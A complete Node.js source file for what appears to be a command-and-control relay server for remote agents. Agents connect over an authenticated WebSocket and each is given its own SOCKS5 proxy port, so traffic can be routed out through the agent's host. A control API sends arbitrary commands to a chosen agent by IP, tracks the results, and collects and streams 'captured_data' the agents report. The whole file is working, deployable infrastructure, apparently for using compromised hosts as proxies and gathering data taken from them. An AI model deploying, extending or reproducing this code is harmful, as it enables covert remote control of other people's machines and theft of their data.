require('dotenv').config();
const WebSocket = require('ws');
const https = require('https');
const fs = require('fs');
const express = require('express');
const socks = require('socksv5');
const crypto = require('crypto');
const winston = require('winston');
const http = require('http');
const selfsigned = require('selfsigned');

const logger = winston.createLogger({
    level: 'debug',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' })
    ]
});

if (process.env.NODE_ENV !== 'production') {
    logger.add(new winston.transports.Console({
        format: winston.format.simple()
    }));
}

class RelayServer {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.wss = new WebSocket.Server({ server: this.server });
        this.agents = new Map();
        this.connections = new Map();
        this.portMap = new Map();
        this.ipToAgentId = new Map();
        this.portRange = { start: 1081, end: 1181 };
        this.socksServers = new Map();

        // Captured data
        this.capturedData = new Map(); // agentId -> array of captured data

        // Task management
        this.taskQueues = new Map(); // agentId -> array of tasks
        this.tasks = new Map(); // taskId -> task object
        this.taskResults = new Map(); // taskId -> result object
        
        // Server-Sent Events clients
        this.sseClients = new Set(); // Set of SSE response objects
        
        this.setupHealthCheck();
        this.setupControlServer();
        this.setupSocksServer();
    }

    setupHealthCheck() {
        this.app.get('/health', (req, res) => {
            res.json({
                status: 'healthy',
                activeAgents: this.agents.size,
                activeConnections: this.connections.size,
                allocatedPorts: this.portMap.size
            });
        });
    }

    setupControlServer() {
        // Create a standard HTTP server for the control endpoint
        const controlApp = express();
        const controlServer = http.createServer(controlApp);

        // CORS middleware
        controlApp.use((req, res, next) => {
            res.header('Access-Control-Allow-Origin', '*');
            res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
            res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');

            // Handle preflight requests
            if (req.method === 'OPTIONS') {
                res.sendStatus(200);
            } else {
                next();
            }
        });

        // Basic authentication middleware
        const basicAuth = (req, res, next) => {
            // Skip basic auth for /events endpoint (uses query param auth instead)
            if (req.path === '/events') {
                return next();
            }
            
            // Check for basic auth header
            const authHeader = req.headers.authorization;
            
            if (!authHeader || !authHeader.startsWith('Basic ')) {
                res.setHeader('WWW-Authenticate', 'Basic');
                return res.status(401).json({ error: 'Authentication required' });
            }
            
            // Verify credentials
            const base64Credentials = authHeader.split(' ')[1];
            const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
            const [username, password] = credentials.split(':');
            
            const isValid = username === process.env.PROXY_USER && 
                           password === process.env.PROXY_PASS;
            
            logger.info({
                event: 'control_server_auth_attempt',
                username,
                success: isValid
            });
            
            if (!isValid) {
                return res.status(401).json({ error: 'Invalid authentication credentials' });
            }
            
            next();
        };
        
        // Apply auth middleware to all routes
        controlApp.use(basicAuth);

        // Add JSON parsing middleware
        controlApp.use(express.json({ limit: '10mb' }));

        // Parse a command from the request body, the request contains:
        // The command object to relay
        // The IP of the agent to relay the command to
        // It will return the taskId of the command
        controlApp.post('/command', (req, res) => {
            try {
                const { command, payload, agentIp } = req.body;
                
                if (!command || !agentIp) {
                    return res.status(400).json({ 
                        error: 'Missing required fields: command, agentIp' 
                    });
                }
                
                // Find agent by IP
                let targetAgentId = null;
                for (const [agentId, agent] of this.agents.entries()) {
                    if (agent.remoteAddress === agentIp) {
                        targetAgentId = agentId;
                        break;
                    }
                }
                
                if (!targetAgentId) {
                    return res.status(404).json({ 
                        error: `No active agent found for IP: ${agentIp}` 
                    });
                }

                const agentPort = this.getPortForAgent(agentIp);
                let targetAgent = null;
                for (const [id, agent] of this.agents.entries()) {
                    if (agent.port === agentPort) {
                        targetAgent = agent.ws;
                        break;
                    }
                }

                if (!targetAgent) {
                    return res.status(503).json({ 
                        error: `No active agent found for IP: ${agentIp} on port: ${agentPort}` 
                    });
                }
                // Generate task ID
                const taskId = crypto.randomUUID();
                
                // Create task object
                const task = {
                    taskId,
                    command,
                    payload: payload || {},
                    agentId: targetAgentId,
                    agentIp,
                    status: 'queued',
                    createdAt: new Date().toISOString(),
                    updatedAt: new Date().toISOString()
                };                

                targetAgent.send(JSON.stringify({
                    type: 'command',
                    taskId,
                    command,
                    payload
                }));

                // Store task
                this.tasks.set(taskId, task);
                
                // Add to agent's queue
                if (!this.taskQueues.has(targetAgentId)) {
                    this.taskQueues.set(targetAgentId, []);
                }
                this.taskQueues.get(targetAgentId).push(task);
                
                // Broadcast task queued via SSE
                this.broadcastSSE('task_queued', {
                    taskId,
                    command,
                    agentIp,
                    status: 'queued'
                });
                
                logger.info({
                    event: 'command_queued',
                    taskId,
                    command,
                    agentId: targetAgentId,
                    agentIp
                });
                
                res.json({ 
                    taskId,
                    status: 'queued',
                    message: 'Command queued successfully'
                });
                
            } catch (error) {
                logger.error({
                    event: 'command_queue_error',
                    error: error.message
                });
                
                res.status(500).json({ 
                    error: 'Internal server error' 
                });
            }
        });
        
        // Task status endpoint
        controlApp.get('/task/:taskId', (req, res) => {
            try {
                const { taskId } = req.params;
                
                if (!taskId) {
                    return res.status(400).json({ 
                        error: 'Missing taskId parameter' 
                    });
                }
                
                const task = this.tasks.get(taskId);
                
                if (!task) {
                    return res.status(404).json({ 
                        error: 'Task not found' 
                    });
                }
                
                // Include result if available
                const result = this.taskResults.get(taskId);
                
                const response = {
                    taskId: task.taskId,
                    command: task.command,
                    status: task.status,
                    createdAt: task.createdAt,
                    updatedAt: task.updatedAt,
                    agentIp: task.agentIp
                };
                
                if (result) {
                    response.result = result;
                }
                
                res.json(response);
                
            } catch (error) {
                logger.error({
                    event: 'task_status_error',
                    error: error.message
                });
                
                res.status(500).json({ 
                    error: 'Internal server error' 
                });
            }
        });
        
        // Control endpoint
        controlApp.get('/info', (req, res) => {
            const agentInfo = [];
            const processedIps = new Set();
            
            // Add active agents
            for (const [agentId, agent] of this.agents.entries()) {
                const ip = agent.remoteAddress;
                processedIps.add(ip);
                
                const port = this.getPortForAgent(ip);
                const connectionCount = Array.from(this.connections.values())
                    .filter(conn => conn.agent === agent.ws).length;
                
                agentInfo.push({
                    agentId,
                    ip,
                    port,
                    active: true,
                    connectionCount,
                    lastSeen: agent.lastSeen
                });
            }
            
            // Add inactive but previously seen agents
            for (const [ip, portData] of this.portMap.entries()) {
                // Skip IPs we've already processed (active agents)
                if (processedIps.has(ip)) {
                    continue;
                }
                
                // Get the agent ID for this IP if it exists
                let agentId = "unknown";
                if (this.ipToAgentId.has(ip)) {
                    agentId = this.ipToAgentId.get(ip);
                }
                
                agentInfo.push({
                    agentId,
                    ip,
                    port: portData.port,
                    active: false,
                    lastSeen: portData.lastSeen
                });
            }
            
            res.json(agentInfo);
        });
        
        // Server-Sent Events endpoint for task completion notifications
        // Note: EventSource doesn't support custom headers, so we use query param auth
        controlApp.get('/events', (req, res) => {
            // Check for auth via query parameter since EventSource can't send headers
            const authToken = req.query.auth;
            if (!authToken) {
                return res.status(401).json({ error: 'Missing auth token' });
            }
            
            // Decode and verify the auth token (should be base64 encoded "username:password")  
            try {
                const credentials = Buffer.from(authToken, 'base64').toString('ascii');
                const [username, password] = credentials.split(':');
                
                const isValid = username === process.env.PROXY_USER && 
                               password === process.env.PROXY_PASS;
                
                if (!isValid) {
                    return res.status(401).json({ error: 'Invalid authentication credentials' });
                }
            } catch (err) {
                return res.status(401).json({ error: 'Invalid auth token format' });
            }
            // Set headers for SSE
            res.writeHead(200, {
                'Content-Type': 'text/event-stream',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Cache-Control'
            });

            // Send initial connection message
            res.write('data: {"type": "connected", "message": "Connected to task events"}\n\n');

            // Add client to the set
            this.sseClients.add(res);

            logger.info({
                event: 'sse_client_connected',
                clientCount: this.sseClients.size
            });

            // Handle client disconnect
            req.on('close', () => {
                this.sseClients.delete(res);
                logger.info({
                    event: 'sse_client_disconnected',
                    clientCount: this.sseClients.size
                });
            });

            req.on('error', (err) => {
                logger.error({
                    event: 'sse_client_error',
                    error: err.message
                });
                this.sseClients.delete(res);
            });
        });
        
        // Start the control server on port 1080
        controlServer.listen(1080, '0.0.0.0', () => {
            logger.info({
                event: 'control_server_started',
                port: 1080
            });
        });
    }

    setupSocksServer() {
        let key, cert;
        try {
            key = fs.readFileSync('/opt/relay-server/certs/key.pem');
            cert = fs.readFileSync('/opt/relay-server/certs/cert.pem');
        } catch (err) {
            logger.warn({
                event: 'no_certificate_found',
                error: err.message
            });
            const attrs = [{ name: 'commonName', value: 'localhost' }];
            const pems = selfsigned.generate(attrs, { 
                days: 365,
                keySize: 2048,
                algorithm: 'sha256'
            });
            key = pems.private;
            cert = pems.cert;
        }
        
        const httpsServer = https.createServer({
            key: key,
            cert: cert
        });
        this.wss = new WebSocket.Server({ server: httpsServer });

        this.wss.on('connection', (ws, req) => {
            const remoteAddress = req.socket.remoteAddress;
            let isAuthorized = false;
            
            const authHeader = req.headers['authorization'];
            if (authHeader && authHeader.startsWith('Bearer ')) {
                const token = authHeader.slice(7);
                if (token === process.env.RELAY_TOKEN) {
                    isAuthorized = true;
                }
            }
            
            if (!isAuthorized) {
                const protocols = req.headers['sec-websocket-protocol'];
                if (protocols) {
                    const protocolList = protocols.split(',').map(p => p.trim());
                    for (const protocol of protocolList) {
                        if (protocol.startsWith('token.')) {
                            const token = protocol.slice(6);
                            if (token === process.env.RELAY_TOKEN) {
                                isAuthorized = true;
                                break;
                            }
                        }
                    }
                }
            }

            if (!isAuthorized) {
                logger.warn({
                    event: 'invalid_auth_attempt',
                    ip: remoteAddress,
                    hasAuthHeader: !!authHeader,
                    hasProtocols: !!req.headers['sec-websocket-protocol']
                });
                ws.close();
                return;
            }

            // Check if we already have an agent ID for this IP
            let agentId;
            let isReconnect = false;
            
            if (this.ipToAgentId.has(remoteAddress)) {
                // Reuse the existing agent ID
                agentId = this.ipToAgentId.get(remoteAddress);
                isReconnect = true;
                
                // If there's an existing connection with this agent ID, close it
                const existingAgent = this.agents.get(agentId);
                if (existingAgent && existingAgent.ws && existingAgent.ws !== ws) {
                    logger.info({
                        event: 'replacing_existing_connection',
                        agentId,
                        ip: remoteAddress
                    });
                    
                    // Close the existing connection gracefully
                    try {
                        existingAgent.ws.close();
                    } catch (err) {
                        // Ignore errors when closing
                    }
                }
            } else {
                // Generate a new agent ID for this IP
                agentId = crypto.randomUUID();
                this.ipToAgentId.set(remoteAddress, agentId);
            }

            const agentInfo = {
                ws,
                remoteAddress,
                lastSeen: Date.now(),
                port: this.getPortForAgent(remoteAddress)
            };
            
            this.agents.set(agentId, agentInfo);
            
            this.ensureSocksServerForAgent(agentId, agentInfo);
            
            logger.info({
                event: isReconnect ? 'agent_reconnected' : 'agent_connected',
                agentId,
                ip: remoteAddress,
                port: agentInfo.port
            });

            ws.on('message', (message) => {
                if (this.agents.has(agentId)) {
                    this.agents.get(agentId).lastSeen = Date.now();
                    
                    if (this.portMap.has(remoteAddress)) {
                        this.portMap.get(remoteAddress).lastSeen = Date.now();
                    }
                }
                
                try {
                    const data = JSON.parse(message.toString());
                    const connection = this.connections.get(data.connectionId);

                    if (data.type === 'command_response') {
                        this.taskResults.set(data.taskId, data.payload);
                        
                        // Get task info for the SSE event
                        const task = this.tasks.get(data.taskId);
                        
                        // Broadcast task completion via SSE
                        this.broadcastSSE('task_completed', {
                            taskId: data.taskId,
                            command: task ? task.command : 'unknown',
                            agentIp: task ? task.agentIp : 'unknown',
                            result: data.payload,
                            status: 'completed'
                        });
                        
                        logger.debug({
                            event: 'command_response',
                            taskId: data.taskId,
                            payload: data.payload
                        });
                        return;
                    } else if (data.type === 'captured_data') {
                        if (!this.capturedData.has(agentId)) {
                            this.capturedData.set(agentId, []);
                        }
                        this.capturedData.get(agentId).push(data);
                        
                        // Get agent info for the SSE event
                        const agent = this.agents.get(agentId);
                        
                        // Broadcast captured data via SSE
                        this.broadcastSSE('captured_data', {
                            agentId,
                            agentIp: agent ? agent.remoteAddress : 'unknown',
                            data: data.data,
                            dataType: data.dataType,
                            timestamp: new Date().toISOString()
                        });
                        
                        logger.debug({
                            event: 'captured_data',
                            agentId,
                            data: data.data,
                            dataType: data.dataType
                        });
                        return;
                    }

                    if (connection && data.type === 'data') {
                        const msgId = data.msgId || crypto.randomBytes(4).toString('hex');
                        logger.debug({
                            event: 'agent_data',
                            connectionId: data.connectionId,
                            msgId,
                            originalMsgId: data.originalMsgId,
                            dataLength: Buffer.from(data.data, 'base64').length,
                            dataPreview: Buffer.from(data.data, 'base64').slice(0, 100).toString('hex')
                        });
                        
                        const buffer = Buffer.from(data.data, 'base64');
                        try {
                            if (!connection.socket.destroyed) {
                                connection.socket.write(buffer, (err) => {
                                    if (err) {
                                        logger.error({
                                            event: 'socket_write_error',
                                            connectionId: data.connectionId,
                                            msgId,
                                            error: err.message
                                        });
                                        this.cleanupConnection(data.connectionId);
                                    } else {
                                        logger.debug({
                                            event: 'data_sent_succesfully',
                                            connectionId: data.connectionId,
                                            msgId,
                                            dataLength: buffer.length                                        })
                                    }
                                });
                            } else {
                                logger.warn({
                                    event: 'socket_destroyed',
                                    connectionId: data.connectionId
                                });
                                this.cleanupConnection(data.connectionId);
                            }
                        } catch (err) {
                            logger.error({
                                event: 'socket_write_exception',
                                connectionId: data.connectionId,
                                error: err.message
                            });
                            this.cleanupConnection(data.connectionId);
                        }
                    } else if (connection && data.type === 'close') {
                        logger.info({
                            event: 'agent_close_request',
                            connectionId: data.connectionId
                        });
                        this.cleanupConnection(data.connectionId);
                    } else if (!connection && data.type === 'close') {
                        // Silently ignore close messages for non-existent connections
                        // This is expected during connection teardown race conditions
                        logger.debug({
                            event: 'late_close',
                            connectionId: data.connectionId
                        });
                    } else if (!connection && data.type === 'data') {
                        logger.debug({
                            event: 'late_data',
                            connectionId: data.connectionId
                        });
                    } else {
                        logger.warn({
                            event: 'unhandled_message',
                            type: data.type,
                            connectionId: data.connectionId,
                            hasConnection: !!connection
                        });
                    }
                } catch (err) {
                    logger.error({
                        event: 'message_processing_error',
                        error: err.message,
                        message: message.toString()
                    });
                }
            });

            ws.on('close', () => {
                logger.info({
                    event: 'agent_disconnected',
                    agentId,
                    ip: remoteAddress,
                    port: agentInfo.port
                });
                
                if (this.portMap.has(remoteAddress)) {
                    this.portMap.get(remoteAddress).lastSeen = Date.now();
                }
                
                // Close all connections for this agent
                for (const [connectionId, connection] of this.connections.entries()) {
                    if (connection.agent === ws) {
                        this.cleanupConnection(connectionId);
                    }
                }
                
                // Remove the agent but keep the IP to agent ID mapping
                this.agents.delete(agentId);
                
                // Note: We intentionally don't remove the IP to agent ID mapping
                // so that if this IP reconnects, it will get the same agent ID
            });
            
            const pingInterval = setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.ping();
                } else {
                    clearInterval(pingInterval);
                }
            }, 30000);

            ws.on('pong', () => {
                ws.isAlive = true;
                if (this.agents.has(agentId)) {
                    this.agents.get(agentId).lastSeen = Date.now();
                    
                    if (this.portMap.has(remoteAddress)) {
                        this.portMap.get(remoteAddress).lastSeen = Date.now();
                    }
                }
            });
        });
        
        httpsServer.listen(process.env.PORT, '0.0.0.0', () => {
            logger.info({
                event: 'websocket_server_started',
                port: process.env.PORT
            });
        });
        
        setInterval(() => {
            this.checkStaleConnections();
        }, 60000);
    }

    getPortForAgent(agentIp) {
        if (this.portMap.has(agentIp)) {
            return this.portMap.get(agentIp).port;
        }
        
        const usedPorts = new Set(Array.from(this.portMap.values()).map(data => data.port));
        
        for (let port = this.portRange.start; port <= this.portRange.end; port++) {
            if (!usedPorts.has(port)) {
                this.portMap.set(agentIp, {
                    port,
                    lastSeen: Date.now()
                });
                return port;
            }
        }
        
        logger.error({
            event: 'port_allocation_failed',
            ip: agentIp,
            message: 'All ports in range are allocated'
        });
        
        return this.portRange.start;
    }

    ensureSocksServerForAgent(agentId, agentInfo) {
        const port = agentInfo.port;
        
        if (this.socksServers.has(port)) {
            return;
        }
        
        const socksServer = socks.createServer((info, accept, deny) => {
            const connectionId = crypto.randomUUID();
            
            let targetAgent = null;
            for (const [id, agent] of this.agents.entries()) {
                if (agent.port === port) {
                    targetAgent = agent.ws;
                    break;
                }
            }
            
            if (!targetAgent) {
                logger.error({
                    event: 'no_agent_for_port',
                    port,
                    address: info.dstAddr,
                    port: info.dstPort
                });
                return deny();
            }

            const socket = accept(true);
            
            this.connections.set(connectionId, {
                socket,
                agent: targetAgent,
                address: info.dstAddr,
                port: info.dstPort,
                createdAt: Date.now()
            });

            logger.info({
                event: 'new_connection',
                connectionId,
                address: info.dstAddr,
                port: info.dstPort,
                agentPort: port
            });

            targetAgent.send(JSON.stringify({
                type: 'connect',
                connectionId,
                targetHost: info.dstAddr,
                targetPort: info.dstPort
            }));

            socket.on('data', (data) => {
                const clientMsgId = crypto.randomBytes(4).toString('hex');
                const buffer = Buffer.from(data);
                logger.debug({
                    event: 'client_data',
                    connectionId,
                    msgId: clientMsgId,
                    dataLength: data.length,
                    data: data.length > 100 ? data.slice(0, 100).toString('hex') : data.toString('hex')
                });
                if (this.connections.has(connectionId)) {
                    targetAgent.send(JSON.stringify({
                        type: 'data',
                        connectionId,
                        msgId: clientMsgId,
                        data: buffer.toString('base64')
                    }));
                }
            });

            socket.on('end', () => {
                targetAgent.send(JSON.stringify({
                    type: 'close',
                    connectionId
                }));
            });

            socket.on('error', (err) => {
                logger.error({
                    event: 'socket_error',
                    connectionId,
                    error: err.message
                });
                targetAgent.send(JSON.stringify({
                    type: 'close',
                    connectionId
                }));
            });
        });
        
        socksServer.useAuth(socks.auth.UserPassword((user, password, cb) => {
            const isValid = user === process.env.PROXY_USER && 
                           password === process.env.PROXY_PASS;            
            logger.info({
                event: 'proxy_auth_attempt',
                username: user,
                port,
                validUser: user === process.env.PROXY_USER,
                validPass: password === process.env.PROXY_PASS,
                success: isValid
            });
            
            cb(isValid);
        }));

        socksServer.listen(port, '0.0.0.0', () => {
            logger.info({
                event: 'socks_server_started',
                port,
                agentId
            });
            this.socksServers.set(port, socksServer);
        });
    }

    cleanupConnection(connectionId) {
        const connection = this.connections.get(connectionId);
        if (connection) {
            connection.socket.destroy();
            this.connections.delete(connectionId);
            
            if (connection.agent.readyState === WebSocket.OPEN) {
                connection.agent.send(JSON.stringify({
                    type: 'close',
                    connectionId
                }));
            }

            logger.info({
                event: 'connection_closed',
                connectionId
            });
        }
    }

    validateAuth(authHeader) {
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return false;
        }

        const token = authHeader.slice(7);
        return token === process.env.RELAY_TOKEN;
    }

    checkStaleConnections() {
        const now = Date.now();
        for (const [connectionId, connection] of this.connections.entries()) {
            if (now - connection.createdAt > 12 * 60 * 60 * 1000) {
                logger.info({
                    event: 'cleaning_stale_connection',
                    connectionId,
                    age: (now - connection.createdAt) / 1000
                });
                this.cleanupConnection(connectionId);
            }
        }
    }

    // Broadcast event to all SSE clients
    broadcastSSE(eventType, data) {
        if (this.sseClients.size === 0) return;

        const eventData = JSON.stringify({
            type: eventType,
            timestamp: new Date().toISOString(),
            ...data
        });

        // Remove disconnected clients
        const disconnectedClients = new Set();

        for (const client of this.sseClients) {
            try {
                client.write(`data: ${eventData}\n\n`);
            } catch (err) {
                logger.error({
                    event: 'sse_broadcast_error',
                    error: err.message
                });
                disconnectedClients.add(client);
            }
        }

        // Clean up disconnected clients
        for (const client of disconnectedClients) {
            this.sseClients.delete(client);
        }

        logger.debug({
            event: 'sse_broadcast',
            eventType,
            clientCount: this.sseClients.size,
            data
        });
    }
}

process.on('uncaughtException', (err) => {
    logger.error({
        event: 'uncaught_exception',
        error: err.message,
        stack: err.stack
    });
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error({
        event: 'unhandled_rejection',
        error: reason
    });
});

const relay = new RelayServer();
